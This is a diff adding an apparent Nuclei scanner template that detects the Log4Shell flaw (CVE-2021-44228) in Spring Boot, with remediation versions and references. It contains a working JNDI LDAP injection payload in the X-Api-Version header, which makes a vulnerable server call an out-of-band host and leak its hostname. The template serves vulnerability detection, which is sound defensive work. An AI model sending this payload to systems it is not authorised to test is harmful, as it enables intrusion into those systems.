@@ -1,0 +1,62 @@
+id: springboot-log4j-rce
+
+info:
+  name: Spring Boot - Remote Code Execution (Apache Log4j)
+  author: pdteam
+  severity: critical
+  description: Spring Boot is susceptible to remote code execution via Apache Log4j.
+  remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
+  reference:
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://github.com/twseptian/Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  metadata:
+    max-request: 1
+  tags: cve,cve2021,springboot,rce,oast,log4j,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+
+# digest: 4b0a00483046022100ad30f44ab5d829d38e6a4c608fd596ba1f7ce4511e0377812c7befd4fee07911022100f1aa882b317311be8a7d92f0211817531e7e5f4c39678912f28ae51def5396d2:922c64590222798bb761d5b6d8e72950
